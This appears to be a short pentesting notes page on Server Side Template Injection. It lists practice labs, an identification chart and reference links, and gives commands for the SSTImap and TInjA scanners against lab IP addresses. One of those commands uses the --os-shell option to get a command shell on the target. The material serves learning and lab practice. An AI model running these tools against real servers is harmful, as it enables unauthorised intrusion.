---
description: Notes about some basic Server Side Template Injection attack
---

# SSTI

Server Side Template Injection (SSTI) is a web exploit which takes advantage of an insecure implementation of a template engine.

### Playground

* [**THM: SSTI**](https://tryhackme.com/r/room/learnssti)
* [**Template Injection Playground**](https://github.com/Hackmanit/template-injection-playground)

### **Identification**

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0iv7fgV7F-YHL8sJ7iP5oPTMpSGNq5MjD-DUf6s0tVtChHCzTlVGdesajYQKk8OiIuaF2Cc_J34xpeYN6xH4dDZsIQYIF8Iwz7k8uqnrIJhHsKjrErSF-mTE2NpR_dv30YTOhQGCJC4DEQOPKIYmyZsT61AIP2rWQQKwIPZEMzoFmr3Vrg6j9uzC1Zw0/s645/ssti.png" alt=""><figcaption><p>Quick Identification</p></figcaption></figure>

[**Template Injection Table**](https://github.com/Hackmanit/template-injection-table)

### **Tools**

**SSTImap**

```bash
## Install
git clone https://github.com/vladko312/SSTImap
cd SSTImap
python3 -m venv sstimap_env
source sstimap_env/bin/activate

Usage:
python3 sstimap.py --help
python3 sstimap.py --random-user-agent --url http://10.10.236.246:5000/profile/*
python3 sstimap.py --random-user-agent --url http://10.10.236.246:5000/profile/* --engine Jinja2
python3 sstimap.py --random-user-agent --url http://10.10.236.246:5000/profile/* --engine Jinja2 --os-shell
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMvTINuzGUfEpkZ0S-tc-klF4MTtjcG5RH92D7Eoxt8M3y9U7Pc4L6VZMxmACJB206t6RkbaBWIzd5UGDnFhPMYsdkauvjlUC77thI_7EBlHKbzO1nO-CUw95rTc16b3muYV-VZmAFmwC4bl-vsVOIB0wQcVmK1aCobmUIdWnpre7sjNSMSfHZkkqxQYg/s1353/sstimap.png" alt=""><figcaption><p><strong>SSTImap</strong></p></figcaption></figure>

**TInjA – the Template INJection Analyzer**

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)

```bash
tinja url -u "http://10.10.242.241:5000/vuln?name=a"
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4zw4BN1ISgV1FWkjIpCGfjMCK-L9EML6OyAtvkFn_MelZnLs7Azt3Af03qh9uNZLKbtQ8SaE7v3aDWtphi3aMZeOFTCtEHK27FBgSk1dTIufqB2rYHg8jiwq-jC1Hd5fw_SX0DtjKo0_Pi_xVIk3FAzsciQkFw1Ff3N4MhCFYFftejMgtKfWira9gZjA/s1259/tinja-tool.png" alt=""><figcaption><p><strong>TInjA – the Template INJection Analyzer</strong></p></figcaption></figure>

### Resources

* [https://hackerone.com/reports/125980](https://hackerone.com/reports/125980)
* [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
